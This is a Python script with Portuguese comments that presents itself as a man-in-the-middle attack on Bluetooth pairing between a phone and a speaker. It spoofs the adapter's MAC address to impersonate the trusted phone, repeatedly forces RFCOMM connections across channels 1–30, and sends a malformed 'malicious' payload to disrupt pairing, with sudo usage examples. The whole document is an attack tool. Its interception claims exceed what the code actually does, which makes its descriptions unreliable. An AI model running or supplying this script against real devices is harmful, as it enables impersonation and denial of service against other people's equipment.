#!/usr/bin/env python3
"""
MITM durante Pareamento - Intercepta e corrompe processo de pareamento
REQUER: Root + Adaptador compatível
"""

import struct
import socket
import sys
import time
import argparse
import subprocess
import os
import threading

def check_root():
    return os.geteuid() == 0

def mac_to_bytes(mac_str):
    return bytes.fromhex(mac_str.replace(':', '').replace('-', ''))

def bytes_to_mac(mac_bytes):
    return ':'.join(f'{b:02X}' for b in mac_bytes)

def enable_scanning(interface='hci0'):
    """Habilita escaneamento para interceptar pareamento"""
    try:
        # Habilita scan via HCI
        subprocess.run(['hciconfig', interface, 'piscan'], 
                      check=True, timeout=2)
        return True
    except:
        return False

def monitor_pairing_requests(target_mac, duration=30):
    """
    Monitora requisições de pareamento e tenta interceptar
    """
    print(f"[*] Monitorando pareamentos para {target_mac}...")
    
    pairing_attempts = []
    start_time = time.time()
    
    try:
        while time.time() - start_time < duration:
            # Usar hcidump para capturar pacotes de pareamento
            # Alternativa: usar btmon ou wireshark
            
            # Verificar conexões ativas
            result = subprocess.run(['hcitool', 'con'],
                                  capture_output=True, text=True, timeout=1)
            
            if target_mac.upper() in result.stdout.upper():
                print(f"[+] Dispositivo {target_mac} detectado em pareamento!")
                return True
            
            time.sleep(0.5)
            
    except KeyboardInterrupt:
        pass
    
    return False

def inject_pairing_response(target_mac, spoofed_mac=None):
    """
    Injeta resposta de pareamento maliciosa
    """
    print(f"[*] Tentando injetar resposta de pareamento...")
    
    try:
        import bluetooth
        
        # Tentar pareamento forçado
        if spoofed_mac:
            print(f"[*] Usando MAC spoofed: {spoofed_mac}")
            # Alterar MAC temporariamente (requer bdaddr)
            original_mac = get_current_mac()
            if set_mac_address('hci0', spoofed_mac):
                time.sleep(1)
        
        # Tentar pareamento
        sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
        sock.settimeout(2)
        
        for channel in range(1, 31):
            try:
                sock.connect((target_mac, channel))
                print(f"[+] Conexão estabelecida no canal {channel}")
                
                # Enviar resposta de pareamento maliciosa
                malicious_response = b'\x00' * 16  # Payload malformado
                sock.send(malicious_response)
                
                sock.close()
                return True
            except:
                continue
        
        return False
    except Exception as e:
        print(f"[-] Erro: {e}")
        return False

def get_current_mac(interface='hci0'):
    """Obtém MAC atual"""
    try:
        result = subprocess.run(['hciconfig', interface],
                              capture_output=True, text=True, timeout=2)
        import re
        match = re.search(r'BD Address: ([0-9A-Fa-f:]{17})', result.stdout)
        if match:
            return match.group(1).upper()
    except:
        pass
    return None

def set_mac_address(interface='hci0', new_mac=None):
    """Altera MAC (requer bdaddr)"""
    try:
        subprocess.run(['hciconfig', interface, 'down'], check=True, timeout=1)
        time.sleep(0.3)
        if new_mac:
            subprocess.run(['bdaddr', '-i', interface, new_mac],
                          check=True, timeout=2)
        subprocess.run(['hciconfig', interface, 'up'], check=True, timeout=1)
        time.sleep(0.3)
        return True
    except:
        return False

def mitm_pairing_attack(target_speaker_mac, trusted_phone_mac=None, duration=60):
    """
    Ataque MITM durante pareamento
    """
    print("=" * 60)
    print("    MITM DURANTE PARAMENTO")
    print("=" * 60)
    print()
    print(f"[*] Alvo (caixa de som): {target_speaker_mac}")
    if trusted_phone_mac:
        print(f"[*] Dispositivo confiado (celular): {trusted_phone_mac}")
    print(f"[*] Duração: {duration} segundos")
    print()
    
    print("[!] INSTRUÇÕES:")
    print("    1. Coloque a caixa de som em modo pareamento")
    print("    2. Tente conectar o celular à caixa")
    print("    3. Este script tentará interceptar o pareamento\n")
    
    input("[*] Pressione ENTER quando estiver pronto...")
    
    # Habilitar modo escaneável/pareável
    print("\n[*] Habilitando modo pareável...")
    enable_scanning('hci0')
    
    start_time = time.time()
    attempt = 0
    
    try:
        while time.time() - start_time < duration:
            attempt += 1
            
            # Método 1: Monitorar e interceptar pareamento
            if monitor_pairing_requests(target_speaker_mac, duration=2):
                print("[+] Pareamento detectado - tentando interceptar...")
                
                # Tentar injetar resposta
                if trusted_phone_mac:
                    inject_pairing_response(target_speaker_mac, trusted_phone_mac)
                else:
                    inject_pairing_response(target_speaker_mac)
            
            # Método 2: Tentar pareamento forçado repetidamente
            if attempt % 5 == 0:
                print(f"[*] Tentativa {attempt}: pareamento forçado...")
                inject_pairing_response(target_speaker_mac)
            
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\n[!] Ataque interrompido")
    
    print(f"\n[+] Ataque concluído: {attempt} tentativas")

def main():
    parser = argparse.ArgumentParser(
        description='MITM durante Pareamento Bluetooth',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
REQUER: Root + Adaptador compatível

Como funciona:
  1. Intercepta processo de pareamento entre celular e caixa
  2. Injeta respostas maliciosas
  3. Pode causar falha no pareamento ou desconexão

Exemplos:
  sudo python3 mitm_pairing.py --target AA:BB:CC:DD:EE:FF
  sudo python3 mitm_pairing.py --target AA:BB:CC:DD:EE:FF --trusted 11:22:33:44:55:66
        """
    )
    
    parser.add_argument('--target', '-t', required=True,
                       help='MAC da caixa de som')
    parser.add_argument('--trusted', '-p', default=None,
                       help='MAC do celular (opcional, para spoof)')
    parser.add_argument('--duration', '-d', type=int, default=60,
                       help='Duração (segundos)')
    
    args = parser.parse_args()
    
    if not check_root():
        print("[!] ERRO: Requer root!")
        sys.exit(1)
    
    mac = args.target.upper().replace('-', ':')
    if len(mac) != 17 or mac.count(':') != 5:
        print("[!] MAC inválido")
        sys.exit(1)
    
    trusted = None
    if args.trusted:
        trusted = args.trusted.upper().replace('-', ':')
        if len(trusted) != 17 or trusted.count(':') != 5:
            print("[!] MAC confiado inválido")
            sys.exit(1)
    
    try:
        mitm_pairing_attack(mac, trusted, args.duration)
    except Exception as e:
        print(f"[!] Erro: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()

